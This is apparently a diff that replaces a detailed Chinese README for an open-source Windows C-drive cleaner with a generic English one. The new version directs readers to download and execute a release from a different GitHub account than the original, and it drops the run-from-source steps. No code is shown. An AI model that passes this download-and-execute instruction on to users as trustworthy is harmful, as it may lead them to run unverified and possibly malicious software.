@@ -1,206 +1,68 @@
-<div align="center">
+# One Click Cleaning of C Drive 🧹💻
 
-# C盘清理工具 (C Drive Cleaner)
+![GitHub release](https://img.shields.io/badge/Release-Download-brightgreen)
 
-<img src="https://img.shields.io/badge/platform-Windows-blue" alt="Platform">
-<img src="https://img.shields.io/badge/language-Python-yellow" alt="Language">
-<img src="https://img.shields.io/badge/license-MIT-green" alt="License">
+Welcome to the **One Click Cleaning of C Drive** repository! This tool allows you to clean your C drive of residual files and junk with just one click. It operates safely and efficiently, ensuring your computer remains unharmed during the cleaning process.
 
-**一个安全、高效、开源的Windows C盘清理工具**
+## Table of Contents
 
-[English](README_EN.md) | 简体中文
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-</div>
+## Features ✨
 
-## 🔥 项目简介
+- **One-Click Operation**: Simplifies the cleaning process to just one click.
+- **Safe Cleaning**: Designed to ensure your computer remains secure.
+- **Efficient Performance**: Cleans residual files and junk quickly.
+- **User-Friendly Interface**: Easy to navigate and use, even for beginners.
 
-C盘清理工具是一个专为Windows系统设计的开源清理软件，无需安装，可以快速、安全地清理C盘上的各类临时文件、缓存和垃圾文件，帮助用户释放宝贵的C盘空间。
+## Installation ⚙️
 
-与其他清理工具不同，本工具特别注重安全性，采用多重安全检查机制，确保不会删除系统和应用程序正常运行所需的文件。同时，它还提供了完善的备份和恢复功能，让用户可以放心清理。
+To get started, you need to download the latest release. You can find it [here](https://github.com/kaustubh1234/One-click-cleaning-of-C-drive/releases). 
 
-## ✨ 主要特性
+After downloading, follow these steps:
 
-### 👍 用户友好的界面
+1. Locate the downloaded file.
+2. Execute the file to install the tool on your system.
+3. Follow the on-screen instructions to complete the installation.
 
-- **一键清理**：直接清理所有可清理项目，无需选择
-- **全选功能**：一键选中所有可清理项目
-- **取消全选**：快速取消所有选中项
-- **备份管理界面**：方便管理和恢复备份
-- **直观的清理结果**：清晰显示释放的空间和清理的文件数量
+## Usage 🖱️
 
-### 💥 强大的清理能力
+Using the One Click Cleaning tool is straightforward. Here’s how:
 
-#### 基本清理
-- 扫描并清理临时文件
-- 清空回收站
-- 清理浏览器缓存
-- 清理系统日志
-- 清理Windows更新缓存
-- 清理缩略图缓存
+1. Open the application.
+2. Click the "Clean C Drive" button.
+3. Wait for the process to complete. You will receive a notification once the cleaning is done.
 
-#### 扩展清理
-- 清理预读取文件
-- 清理旧Windows文件
-- 清理错误报告
-- 清理服务包备份
-- 清理内存转储文件
-- 清理字体缓存
-- 清理磁盘清理备份
+### Additional Options
 
-#### 新增安全清理项
-- 清理应用程序缓存（Adobe、Office等）
-- 清理媒体播放器缓存（Windows Media Player、VLC、Spotify等）
-- 清理搜索索引临时文件
-- 清理备份临时文件
-- 清理更新临时文件
-- 清理驱动备份
-- 清理应用程序崩溃转储
-- 清理应用程序日志
-- 清理最近使用的文件列表
-- 清理Windows通知缓存
-- 清理DNS缓存
-- 清理网络缓存
-- 清理打印机临时文件
-- 清理设备临时文件
-- 清理Windows Defender缓存
-- 清理Windows Store缓存
-- 清理OneDrive缓存
+You can also customize the cleaning options:
 
-#### 新增用户请求的清理项
-- 清理下载文件夹(立即清理) - 清理下载文件夹中的所有文件
-- 清理安装程序缓存(30天前) - 清理临时文件和超过30天的缓存
-- 清理Windows传递优化缓存(立即清理) - 清理所有Windows传递优化缓存文件
+- **Select Specific Folders**: Choose which folders to clean.
+- **Schedule Cleanings**: Set a schedule for regular cleaning.
 
-#### 大文件扫描
-- 扫描并显示C盘中的大文件（超过100MB）
-- 显示文件大小、修改时间和文件类型
-- 帮助用户快速定位占用空间较大的文件
+## Contributing 🤝
 
-### 安全特性
-- 模拟模式（预览而不实际删除）
-- 文件备份功能
-- 安全检查，防止删除重要系统文件
-- 智能识别可安全删除的文件
+We welcome contributions from the community! If you would like to help improve this project, please follow these steps:
 
-## 💻 系统要求
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your forked repository.
+5. Open a pull request to the main repository.
 
-- Windows 7/8/10/11
-- Python 3.6+
+Please ensure your code adheres to the existing style and includes tests where applicable.
 
-## 🚀 快速开始
+## License 📜
 
-### 方法一：直接下载可执行文件
+This project is licensed under the MIT License. You can find the full license text in the LICENSE file in this repository.
 
-1. 前往 [Releases](https://github.com/JIEKE66633/One-click-cleaning-of-C-drive/releases) 页面
-2. 下载最新版本的压缩包
-3. 解压缩到任意位置
-4. 双击“启动C盘清理工具.bat”文件运行程序
+## Support 💬
 
-### 方法二：从源代码运行
+If you encounter any issues or have questions, please check the [Releases](https://github.com/kaustubh1234/One-click-cleaning-of-C-drive/releases) section for updates. You can also open an issue in the repository, and we will get back to you as soon as possible.
 
-1. 克隆仓库：
-```bash
-git clone https://github.com/JIEKE66633/One-click-cleaning-of-C-drive.git
-```
-
-2. 进入项目目录：
-```bash
-cd One-click-cleaning-of-C-drive
-```
-
-3. 安装依赖：
-```bash
-pip install -r requirements.txt
-```
-
-4. 运行程序：
-```bash
-python main.py
-```
-
-## 📚 使用指南
-
-### 基本使用
-
-1. 启动程序后，点击“扫描系统”按钮
-2. 程序会扫描系统中可清理的文件并显示在列表中
-3. 选择您想要清理的项目，或点击“全选”按钮选择所有项目
-4. 点击“清理选中项”按钮开始清理
-
-### 一键清理
-
-如果您想要快速清理系统，可以直接点击“一键清理”按钮，程序会自动扫描并清理所有可清理项目。
-
-### 备份管理
-
-1. 点击“备份管理”按钮打开备份管理界面
-2. 在备份管理界面中，您可以查看、恢复或删除备份
-3. 您还可以设置备份目录、最大备份数量和总大小
-
-### 🔒 安全特性
-
-- **模拟模式**：可以预览将要删除的文件而不实际删除
-- **文件备份**：删除前自动备份文件，以便需要时恢复
-- **安全路径检查**：防止删除重要系统文件
-- **用户确认**：重要操作前需要用户确认
-
-### 🗃️ 备份管理功能
-
-- **自定义备份位置**：可以选择将备份文件存储在非C盘的位置
-- **备份管理界面**：查看、恢复或删除备份
-- **自动清理旧备份**：自动删除最旧的备份，保持备份空间在合理范围内
-- **备份限制设置**：可以设置最大备份数量和总大小
-
-### 🔍 大文件扫描
-
-- **快速定位大文件**：扫描并显示C盘中的大文件（超过100MB）
-- **详细信息显示**：显示文件大小、修改时间和文件类型
-
-## 💬 常见问题
-
-### 备份文件是否影响系统运行？
-
-备份文件只是被删除文件的副本，存储在单独的位置，不会影响系统的运行。如果系统运行正常，可以安全地删除备份文件。
-
-### 清理后会影响系统或应用程序吗？
-
-本工具经过精心设计，只清理安全可删除的文件，如临时文件、缓存和垃圾文件。正常情况下不会影响系统或应用程序的正常运行。
-
-### 为什么需要模拟模式？
-
-模拟模式可以让您在不实际删除文件的情况下预览将要删除的文件，这对于首次使用的用户非常有用，可以帮助您了解工具的工作方式。
-
-## 📝 贡献指南
-
-我们非常欢迎并感谢所有形式的贡献！以下是参与该项目的一些方式：
-
-1. **提交问题和建议**：如果您发现了问题或有改进建议，请在GitHub上提交Issue
-2. **提交代码**：如果您想要添加新功能或修复问题，请Fork仓库并提交Pull Request
-3. **改进文档**：帮助我们改进文档，使其更加清晰和完整
-
-请确保您的代码符合项目的代码风格和质量标准。
-
-## 💯 项目计划
-
-我们计划在未来版本中添加以下功能：
-
-- [ ] 定时清理功能
-- [ ] 更详细的清理报告
-- [ ] 更多自定义清理选项
-- [ ] 多语言支持
-
-## 👬 贡献者
-
-感谢所有为该项目做出贡献的人！
-
-## 🔒 许可证
-
-本项目采用 [MIT 许可证](LICENSE)。
-
-
-## ❗ 注意事项
-
-- 首次使用时建议启用模拟模式
-- 清理系统文件前请确保了解其用途
-- 定期备份重要数据
-- 如果清理后系统运行正常，可以安全删除备份文件
+Thank you for using the **One Click Cleaning of C Drive** tool! We hope it makes your computer maintenance easier and more efficient.
